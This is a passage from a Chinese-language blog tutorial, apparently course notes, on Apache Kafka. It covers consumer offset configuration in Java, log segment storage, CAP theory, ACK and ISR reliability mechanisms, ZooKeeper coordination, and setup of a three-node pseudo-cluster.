class="attr">class</span>=<span class="string">"ch.qos.logback.core.ConsoleAppender"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">encoder</span> <span class="attr">class</span>=<span class="string">"ch.qos.logback.classic.encoder.PatternLayoutEncoder"</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- 格式化输出： %d表示日期， %thread表示线程名， %-5level: 级别从左显示5个字符宽度 %msg:日志消息, %n是换行符 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">pattern</span>&gt;</span>%d&#123;yyyy-MM-dd HH:mm:ss.SSS&#125;[%thread] %-5level %logger&#123;50&#125; - %msg%n<span class="tag">&lt;/<span class="name">pattern</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">encoder</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">appender</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">root</span> <span class="attr">level</span>=<span class="string">"info"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">appender-ref</span> <span class="attr">ref</span>=<span class="string">"STDOUT"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure><p>消费者配置</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#消费者分组ID，分组内的消费者只能消费该消息一次，不同分组内的消费者可以重复消费该消息</span></span><br><span class="line"><span class="attr">group.id</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#为true则自动提交偏移量</span></span><br><span class="line"><span class="attr">enable.auto.commit</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#自动提交offset周期</span></span><br><span class="line"><span class="attr">auto.commit.interval.ms</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#重置消费偏移量策略，消费者在读取一个没有偏移量的分区或者偏移量无效情况下（因消费者长时间失效、包含偏移量的记录已经过时并被删除）该如何处理，</span></span><br><span class="line"><span class="comment">#默认是latest，如果需要从头消费partition消息，需要改为 earliest 且消费者组名变更 才可以</span></span><br><span class="line"><span class="attr">auto.offset.reset</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#序列化器</span></span><br><span class="line"><span class="attr">key.deserializer</span></span><br></pre></td></tr></table></figure><h2 id="Kafka消费者Consumer消费消息配置实战"><a href="#Kafka消费者Consumer消费消息配置实战" class="headerlink" title="Kafka消费者Consumer消费消息配置实战"></a>Kafka消费者Consumer消费消息配置实战</h2><p>配置</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Properties <span class="title">getProperties</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        Properties props = <span class="keyword">new</span> Properties();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//broker地址</span></span><br><span class="line">        props.put(<span class="string">"bootstrap.servers"</span>, <span class="string">"101.132.252.118:9092"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//消费者分组ID，分组内的消费者只能消费该消息一次，不同分组内的消费者可以重复消费该消息</span></span><br><span class="line">        props.put(<span class="string">"group.id"</span>, <span class="string">"xdclass-g1"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//开启自动提交offset</span></span><br><span class="line">        props.put(<span class="string">"enable.auto.commit"</span>, <span class="string">"true"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//自动提交offset延迟时间</span></span><br><span class="line">        props.put(<span class="string">"auto.commit.interval.ms"</span>, <span class="string">"1000"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//反序列化</span></span><br><span class="line">        props.put(<span class="string">"key.deserializer"</span>, <span class="string">"org.apache.kafka.common.serialization.StringDeserializer"</span>);</span><br><span class="line">        props.put(<span class="string">"value.deserializer"</span>, <span class="string">"org.apache.kafka.common.serialization.StringDeserializer"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> props;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>消费订阅</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">simpleConsumerTest</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Properties props = getProperties();</span><br><span class="line">    KafkaConsumer&lt;String, String&gt; consumer = <span class="keyword">new</span> KafkaConsumer&lt;&gt;(props);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//订阅topic主题</span></span><br><span class="line">    consumer.subscribe(Arrays.asList(KafkaProducerTest.TOPIC_NAME));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">        <span class="comment">//拉取时间控制，阻塞超时时间</span></span><br><span class="line">        ConsumerRecords&lt;String, String&gt; records = consumer.poll(Duration.ofMillis(<span class="number">500</span>));</span><br><span class="line">        <span class="keyword">for</span> (ConsumerRecord&lt;String, String&gt; record : records) &#123;</span><br><span class="line">            System.err.printf(<span class="string">"topic = %s, offset = %d, key = %s, value = %s%n"</span>,record.topic(), record.offset(), record.key(), record.value());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Consumer从头消费配置和手工提交offset配置"><a href="#Consumer从头消费配置和手工提交offset配置" class="headerlink" title="Consumer从头消费配置和手工提交offset配置"></a>Consumer从头消费配置和手工提交offset配置</h2><p>如果需要从头消费partition消息，怎么操作？</p><ul><li>auto.offset.reset 配置策略即可</li><li>默认是latest，需要改为 earliest 且消费者组名变更 ，即可实现从头消费</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//默认是latest，如果需要从头消费partition消息，需要改为 earliest 且消费者组名变更，才生效 </span></span><br><span class="line">props.put(<span class="string">"auto.offset.reset"</span>,<span class="string">"earliest"</span>);</span><br></pre></td></tr></table></figure><p>自动提交offset问题</p><ul><li>没法控制消息是否正常被消费</li><li>适合非严谨的场景，比如日志收集发送</li></ul><p>手工提交offset配置和测试</p><ul><li>初次启动消费者会请求broker获取当前消费的offset值</li></ul><p>手工提交offset</p><ul><li>同步 commitSync 阻塞当前线程 (自动失败重试）</li><li>异步 commitAsync 不会阻塞当前线程 (没有失败重试，回调callback函数获取提交信息，记录日志)</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">simpleConsumerTest</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Properties props = getProperties();</span><br><span class="line">    KafkaConsumer&lt;String, String&gt; consumer = <span class="keyword">new</span> KafkaConsumer&lt;&gt;(props);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//订阅topic主题</span></span><br><span class="line">    consumer.subscribe(Arrays.asList(KafkaProducerTest.TOPIC_NAME));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">        <span class="comment">//拉取时间控制，阻塞超时时间</span></span><br><span class="line">        ConsumerRecords&lt;String, String&gt; records = consumer.poll(Duration.ofMillis(<span class="number">500</span>));</span><br><span class="line">        <span class="keyword">for</span> (ConsumerRecord&lt;String, String&gt; record : records) &#123;</span><br><span class="line">            System.err.printf(<span class="string">"topic = %s, offset = %d, key = %s, value = %s%n"</span>,record.topic(), record.offset(), record.key(), record.value());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!records.isEmpty())&#123;</span><br><span class="line">            <span class="comment">//异步 commitAsync 手工提交</span></span><br><span class="line">            consumer.commitAsync(<span class="keyword">new</span> OffsetCommitCallback() &#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onComplete</span><span class="params">(Map&lt;TopicPartition, OffsetAndMetadata&gt; offsets, Exception exception)</span> </span>&#123;</span><br><span class="line">                    <span class="keyword">if</span>(exception == <span class="keyword">null</span>)&#123;</span><br><span class="line">                        System.err.println(<span class="string">"手工提交offset成功"</span>+offsets.toString());</span><br><span class="line">                    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                        System.err.println(<span class="string">"手工提交offset失败"</span>+offsets.toString());</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="kafka数据文件存储-可靠性保证-ISR核心知识"><a href="#kafka数据文件存储-可靠性保证-ISR核心知识" class="headerlink" title="kafka数据文件存储-可靠性保证-ISR核心知识"></a>kafka数据文件存储-可靠性保证-ISR核心知识</h1><h2 id="Kafka数据存储流程和log日志"><a href="#Kafka数据存储流程和log日志" class="headerlink" title="Kafka数据存储流程和log日志"></a>Kafka数据存储流程和log日志</h2><ul><li>Kafka 采取了<strong>分片</strong>和<strong>索引</strong>机制，将每个partition分为多个segment，每个segment对应2个文件 log 和 index</li><li>新增备注</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">index文件中并没有为每一条message建立索引，采用了稀疏存储的方式</span><br><span class="line">每隔一定字节的数据建立一条索引，避免了索引文件占用过多的空间和资源，从而可以将索引文件保留到内存中</span><br><span class="line">缺点是没有建立索引的数据在查询的过程中需要小范围内的顺序扫描操作。</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20210613165726.png" alt="image-20210613165723685"></p><p>配置文件 server.properties</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># The maximum size of a log segment file. When this size is reached a new log segment will be created. 默认是1G,当log数据文件大于1g后，会创建一个新的log文件（即segment，包括index和log）</span></span><br><span class="line"><span class="meta">log.segment.bytes</span>=<span class="string">1073741824</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20210613170743.png" alt="image-20210613170738940"></p><p>例子</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#分段一</span><br><span class="line">00000000000000000000.index  00000000000000000000.log</span><br><span class="line">#分段二 数字 1234指的是当前文件的最小偏移量offset，即上个文件的最后一个消息的offset+1</span><br><span class="line">00000000000000001234.index  00000000000000001234.log</span><br><span class="line">#分段三</span><br><span class="line">00000000000000088888.index  00000000000000088888.log</span><br></pre></td></tr></table></figure><h2 id="【核心】分布式系统的CAP理论"><a href="#【核心】分布式系统的CAP理论" class="headerlink" title="【核心】分布式系统的CAP理论"></a>【核心】分布式系统的CAP理论</h2><ul><li>CAP定理: 指的是在一个分布式系统中，Consistency（一致性）、 Availability（可用性）、Partition tolerance（分区容错性），三者不可同时获得<ul><li>一致性（C）：所有节点都可以访问到最新的数据；锁定其他节点，不一致之前不可读</li><li>可用性（A）：每个请求都是可以得到响应的，不管请求是成功还是失败；被节点锁定后 无法响应</li><li>分区容错性（P）：除了全部整体网络故障，其他故障都不能导致整个系统不可用,；节点间通信可能失败，无法避免</li></ul></li><li>CAP理论就是说在分布式存储系统中，最多只能实现上面的两点。而由于当前的网络硬件肯定会出现延迟丢包等问题，所以分区容忍性是我们必须需要实现的。所以我们只能在一致性和可用性之间进行权衡</li></ul><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20210613170939.png" alt="image-20210613170936248"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CA： 如果不要求P（不允许分区），则C（强一致性）和A（可用性）是可以保证的。但放弃P的同时也就意味着放弃了系统的扩展性，也就是分布式节点受限，没办法部署子节点，这是违背分布式系统设计的初衷的</span><br><span class="line"></span><br><span class="line">CP: 如果不要求A（可用），每个请求都需要在服务器之间保持强一致，而P（分区）会导致同步时间无限延长(也就是等待数据同步完才能正常访问服务)，一旦发生网络故障或者消息丢失等情况，就要牺牲用户的体验，等待所有数据全部一致了之后再让用户访问系统</span><br><span class="line"></span><br><span class="line">AP：要高可用并允许分区，则需放弃一致性。一旦分区发生，节点之间可能会失去联系，为了高可用，每个节点只能用本地数据提供服务，而这样会导致全局数据的不一致性。</span><br></pre></td></tr></table></figure><p>结论：</p><ul><li>分布式系统中P,肯定要满足，所以只能在CA中二选一</li><li>没有最好的选择，最好的选择是根据业务场景来进行架构设计</li><li>CP ： 适合支付、交易类，要求数据强一致性，宁可业务不可用，也不能出现脏数据</li><li>AP: 互联网业务，比如信息流架构，不要求数据强一致，更想要服务可用</li></ul><h2 id="Kafka数据可靠性保证原理之副本Replica-ACK"><a href="#Kafka数据可靠性保证原理之副本Replica-ACK" class="headerlink" title="Kafka数据可靠性保证原理之副本Replica+ACK"></a>Kafka数据可靠性保证原理之副本Replica+ACK</h2><ul><li>背景<ul><li>Kafka之间副本数据同步是怎样的？一致性怎么保证，数据怎样保证不丢失呢</li></ul></li><li>kafka的副本（replica）<ul><li>topic可以设置有N个副本, 副本数最好要小于broker的数量</li><li>每个分区有1个leader和0到多个follower，我们把多个replica分为Learder replica和follower replica</li></ul></li></ul><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20210613171206.png" alt="image-20210613171204652"></p><p>生产者发送数据流程</p><ul><li>保证producer 发送到指定的 topic， topic 的每个 partition 收到producer 发送的数据后</li><li>需要向 producer 发送 ack 确认收到，如果producer 收到 ack， 就会进行下一轮的发送否则重新发送数据</li></ul><p>问题点：Partition什么时间发送ack确认机制（要追求高吞吐量，那么就要放弃可靠性）</p><p> 当producer向leader发送数据时，可以通过request.required.acks参数来设置数据可靠性的级别</p><ul><li><p>副本数据同步策略 , ack有3个可选值，分别是0, 1，all。</p><ul><li><p>ack=0</p><ul><li>producer发送一次就不再发送了，不管是否发送成功</li><li>发送出去的消息还在半路，或者还没写入磁盘， Partition Leader所在Broker就直接挂了，客户端认为消息发送成功了，此时就会导致这条消息就丢失</li></ul></li><li><p>ack=1(默认)</p><ul><li>只要Partition Leader接收到消息而且写入【本地磁盘】，就认为成功了，不管他其他的Follower有没有同步过去这条消息了</li><li>问题：万一Partition Leader刚刚接收到消息，Follower还没来得及同步过去，结果Leader所在的broker宕机了</li></ul></li><li><p>ack= all（即-1）</p><ul><li><p>producer只有收到分区内所有副本的成功写入全部落盘的通知才认为推送消息成功</p></li><li><p>备注：leader会维持一个与其保持同步的replica集合，该集合就是ISR，leader副本也在isr里面</p></li><li><p>问题一：如果在follower同步完成后，broker发送ack之前，leader发生故障，那么会造成数据重复</p><ul><li>数据发送到leader后 ，部分ISR的副本同步，leader此时挂掉。比如follower1和follower2都有可能变成新的leader, producer端会得到返回异常，producer端会重新发送数据，数据可能会重复</li></ul></li><li><p>问题二：acks=all 就可以代表数据一定不会丢失了吗</p><ul><li>Partition只有一个副本，也就是一个Leader，任何Follower都没有</li><li>接收完消息后宕机，也会导致数据丢失，acks=all，必须跟ISR列表里至少有2个以上的副本配合使用</li><li>在设置request.required.acks=-1的同时，也要min.insync.replicas这个参数设定 ISR中的最小副本数是多少，默认值为1，改为 &gt;=2，如果ISR中的副本数少于min.insync.replicas配置的数量时，客户端会返回异常</li></ul></li></ul></li></ul></li></ul><h2 id="Kafka的in-sync-replica-set机制"><a href="#Kafka的in-sync-replica-set机制" class="headerlink" title="Kafka的in-sync replica set机制"></a>Kafka的in-sync replica set机制</h2><ul><li>什么是ISR (<strong>in-sync replica set</strong> )<ul><li>leader会维持一个与其保持同步的replica集合，该集合就是ISR，每一个leader partition都有一个ISR，leader动态维护, 要保证kafka不丢失message，就要保证ISR这组集合存活（至少有一个存活），并且消息commit成功</li><li>Partition leader 保持同步的 Partition Follower 集合, 当 ISR 中的Partition Follower 完成数据的同步之后，就会给 leader 发送 ack</li><li>如果Partition follower长时间(replica.lag.time.max.ms) 未向leader同步数据，则该Partition Follower将被踢出ISR</li><li>Partition Leader 发生故障之后，就会从 ISR 中选举新的 Partition Leader。</li></ul></li><li>OSR （out-of-sync-replica set）：与leader副本分区 同步滞后过多的副本集合</li><li>AR（Assign Replicas）：分区中所有副本统称为AR</li></ul><h2 id="Kafka的HighWatermark的作用"><a href="#Kafka的HighWatermark的作用" class="headerlink" title="Kafka的HighWatermark的作用"></a>Kafka的HighWatermark的作用</h2><ul><li><p>背景 broker故障后</p><ul><li>ACK保障了【生产者】的投递可靠性</li><li>partition的多副本保障了【消息存储】的可靠性</li><li>备注：重复消费问题需要消费者自己处理</li></ul></li><li><p>HW作用：保证消费数据的一致性和副本数据的一致性</p></li><li><p>Follower故障</p><ul><li>Follower发生故障后会被临时踢出ISR（动态变化），待该follower恢复后，follower会读取本地的磁盘记录的上次的HW，并将该log文件高于HW的部分截取掉，从HW开始向leader进行同步，等该follower的LEO大于等于该Partition的hw，即follower追上leader后，就可以重新加入ISR</li></ul></li><li><p>Leader故障</p><ul><li>Leader发生故障后，会从ISR中选出一个新的leader，为了保证多个副本之间的数据一致性，其余的follower会先将各自的log文件高于hw的部分截掉（新leader自己不会截掉），然后从新的leader同步数据</li></ul></li></ul><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20210613171903.png" alt="image-20210613171900754"></p><h1 id="kafka高可用集群和高性能"><a href="#kafka高可用集群和高性能" class="headerlink" title="kafka高可用集群和高性能"></a>kafka高可用集群和高性能</h1><h2 id="Kafka高可用集群搭建节点需求规划"><a href="#Kafka高可用集群搭建节点需求规划" class="headerlink" title="Kafka高可用集群搭建节点需求规划"></a>Kafka高可用集群搭建节点需求规划</h2><ul><li>注意<ul><li>没那么多机器，采用伪集群方式搭建（端口号区分）</li><li>zookeeper部署3个节点<ul><li>2181</li><li>2182</li><li>2183</li></ul></li><li>kafka部署3个节点<ul><li>9092</li><li>9093</li><li>9094</li></ul></li></ul></li><li>网络安全组记得开放端口</li></ul><h2 id="Kafka-ZooKeeper"><a href="#Kafka-ZooKeeper" class="headerlink" title="Kafka + ZooKeeper"></a>Kafka + ZooKeeper</h2><p>ZooKeeper 的官网是：<a href="https://zookeeper.apache.org/。在官网上是这么介绍" target="_blank" rel="noopener">https://zookeeper.apache.org/。在官网上是这么介绍</a> ZooKeeper 的：ZooKeeper 是一项集中式服务，用于维护配置信息，命名，提供分布式同步和提供组服务。当我们编写程序的时候，通常会将所有的配置信息保存在一个配置文件中，例如账号、密码等信息，后续直接修改配置文件就行了，那分布式场景下如何配置呢？如果说每台机器上都保存一个配置文件，这时候要一台台的去修改配置文件难免出错，而且要管理这些机器也会变得复杂和困难，ZooKeeper 的出现就是为了解决这类问题，实现高度可靠的分布式系统。</p><ol><li><p><strong>配置管理</strong>：ZooKeeper 为分布式系统提供了一种配置管理的服务：集中管理配置，即将全局配置信息保存在 ZooKeeper 服务中，方便进行修改和管理，省去了手动拷贝配置的过程，同时还保证了可靠和一致性。</p></li><li><p><strong>命名服务</strong>：在分布式系统中，经常需要对应用或者服务进行统一命名，便于识别和区分开来，而 ZooKeeper 就提供了这种服务。</p></li><li><p><strong>分布式锁</strong>：</p><p>　锁应该都不陌生，没有用过也听说过，在多个进程访问互斥资源的时候，需要加上一道锁。在分布式系统中，分布式程序分布在各个主机上的进程对互斥资源进行访问时也需要加锁。</p><p>　　分布式锁应当具备以下条件：</p><ul><li>在分布式系统环境下，一个方法在同一时间只能被一个机器的一个线程执行；</li><li>高可用的获取锁与释放锁；</li><li>高性能的获取锁与释放锁；</li><li>具备可重入特性（可理解为重新进入，由多于一个任务并发使用，而不必担心数据错误）；</li><li>具备锁失效机制，防止死锁；</li><li>具备非阻塞锁特性，即没有获取到锁将直接返回获取锁失败。</li></ul></li><li><p><strong>集群管理</strong>：　在分布式系统中，由于各种各样的原因，例如机器故障、网络故障等，导致集群中的节点增加或者减少，集群中有些机器需要感知到这种变化，然后根据这种变化做出对应的决策。</p></li><li><p><strong>基本架构</strong>：</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20210613172615.png" alt="image-20210613172612357"></p></li></ol><p><strong>Kafka + ZooKeeper</strong></p><p>ZooKeeper 作为给分布式系统提供协调服务的工具被 kafka 所依赖。在分布式系统中，消费者需要知道有哪些生产者是可用的，而如果每次消费者都需要和生产者建立连接并测试是否成功连接，那效率也太低了，显然是不可取的。而通过使用 ZooKeeper 协调服务，Kafka 就能将 Producer，Consumer，Broker 等结合在一起，同时借助 ZooKeeper，Kafka 就能够将所有组件在无状态的条件下建立起生产者和消费者的订阅关系，实现负载均衡。</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20210613174100.png" alt="image-20210613174057292"></p><p><strong>Broker 信息</strong></p><p>　　在 ZooKeeper 上会有一个专门用来进行 Broker 服务器列表记录的节点，节点路径为 /brokers/ids。Kafka 的每个 Broker 启动时，都会在 ZooKeeper 中注册，创建 /brokers/ids/[0-N] 节点，写入 IP，端口等信息，每个 Broker 都有一个 BrokerId。Broker 创建的是临时节点，在连接断开时节点就会自动删除，所以在 ZooKeeper 上就可以通过 Broker 中节点的变化来得到 Broker 的可用性。</p><p><strong>Topic 信息</strong></p><p>　　在 Kafka 中可以定义很多个 Topic，每个 Topic 又被分为很多个 Partition。一般情况下，每个 Partition 独立在存在一个 Broker 上，所有的这些 Topic 和 Broker 的对应关系都由 ZooKeeper 进行维护。</p><p><strong>负载均衡</strong></p><p>　　生产者需要将消息发送给 Broker，消费者需要从 Broker 上获取消息，通过使用 ZooKeeper，就都能监听 Broker 上节点的状态信息，从而实现动态负载均衡。</p><p><strong>offset 信息</strong></p><p>　　offset 用于记录消费者消费到的位置，在老版本（0.9以前）里 offset 是保存在 ZooKeeper 中的。</p><p><strong>Controller 选举</strong></p><p>　　在 Kafka 中会有多个 Broker，其中一个 Broker 会被选举成为 Controller（控制器），在任意时刻，Kafka 集群中有且仅有一个控制器。Controller负责管理集群中所有分区和副本的状态，当某个分区的 leader 副本出现故障时，由 Controller 为该分区选举出一个新的 leader。Kafka 的 Controller 选举就依靠 ZooKeeper 来完成，成功竞选为 Controller 的 Broker 会在 ZooKeeper 中创建 /controller 这个临时节点，在 ZooKeeper 中使用 get 命令查看节点内容：</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20210613174655.png" alt="image-20210613174645754"></p><p>其中“version”在目前版本中固定为1，“brokerid”表示 Broker 的编号，“timestamp”表示竞选称为 Controller 时的时间戳。</p><p>当 Broker 启动时，会尝试读取 /controller 中的“brokerid”，如果读取到的值不是-1，则表示已经有节点竞选成为 Controller 了，当前节点就会放弃竞选；而如果读取到的值为-1，ZooKeeper 就会尝试创建 /controller 节点，当该 Broker 去创建的时候，可能还有其他 Broker 一起同时创建节点，但只有一个 Broker 能够创建成功，即成为唯一的 Controller。</p><h2 id="Kafka高可用集群之zookeeper集群环境准备"><a href="#Kafka高可用集群之zookeeper集群环境准备" class="headerlink" title="Kafka高可用集群之zookeeper集群环境准备"></a>Kafka高可用集群之zookeeper集群环境准备</h2><ul><li><p>cp -r 复制zk节点，一共3个</p></li><li><p>修改配置zoo.cfg</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#客户端端口，三个客户端端口分别为2181 2182 2183</span></span><br><span class="line"><span class="attr">clientPort</span>=<span class="string">2181</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#数据存储路径，/tmp/zookeeper/2181 /tmp/zookeeper/2182 /tmp/zookeeper/2183</span></span><br><span class="line"><span class="attr">dataDir</span>=<span class="string">/tmp/zookeeper/2181</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#修改AdminServer的端口：8888 8889 8890</span></span><br><span class="line"><span class="meta">admin.serverPort</span>=<span class="string">8888</span></span><br></pre></td></tr></table></figure></li><li><p>dataDir对应目录下分别创建myid文件，内容对应1、2、3</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp/zookeeper/2181</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; myid</span><br></pre></td></tr></table></figure></li><li><p>配置集群</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># server.服务器id=服务器IP地址:服务器直接通信端口:服务器之间选举投票端口</span></span><br><span class="line"></span><br><span class="line"><span class="meta">server.1</span>=<span class="string">127.0.0.1:2881:3881</span></span><br><span class="line"><span class="meta">server.2</span>=<span class="string">127.0.0.1:2882:3882</span></span><br><span class="line"><span class="meta">server.3</span>=<span class="string">127.0.0.1:2883:3883</span></span><br></pre></td></tr></table></figure></li><li><p>zk命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#启动zk</span></span><br><span class="line">./zkServer.sh  start</span><br><span class="line"></span><br><span class="line"><span class="comment">#查看节点状态</span></span><br><span class="line">./zkServer.sh status</span><br><span class="line"></span><br><span class="line"><span class="comment">#停止节点</span></span><br><span class="line">./zkServer.sh stop</span><br></pre></td></tr></table></figure></li></ul><h2 id="Kafka高可用集群搭建-环境准备"><a href="#Kafka高可用集群搭建-环境准备" class="headerlink" title="Kafka高可用集群搭建-环境准备"></a>Kafka高可用集群搭建-环境准备</h2><ul><li><p>伪集群搭建，3个节点同个机器端口区分</p><ul><li>9092</li><li>9093</li><li>9094</li></ul></li><li><p>配置</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#内网中使用，内网部署 kafka 集群只需要用到 listeners，内外网需要作区分时 才需要用到advertised.listeners</span></span><br><span class="line"><span class="attr">listeners</span>=<span class="string">PLAINTEXT://172.23.148.108:9092</span></span><br><span class="line"></span><br><span class="line"><span class="meta">advertised.listeners</span>=<span class="string">PLAINTEXT://101.132.252.118:9092</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#每个节点编号1、2、3</span></span><br><span class="line"><span class="meta">broker.id</span>=<span class="string">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#端口</span></span><br><span class="line"><span class="attr">port</span>=<span class="string">9092</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#配置3个</span></span><br><span class="line"><span class="meta">log.dirs</span>=<span class="string">/tmp/kafka-logs-1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#zk地址</span></span><br><span class="line"><span class="meta">zookeeper.connect</span>=<span class="string">localhost:2181,localhost:2182,localhost:2183</span></span><br></pre></td></tr></table></figure></li></ul><h1 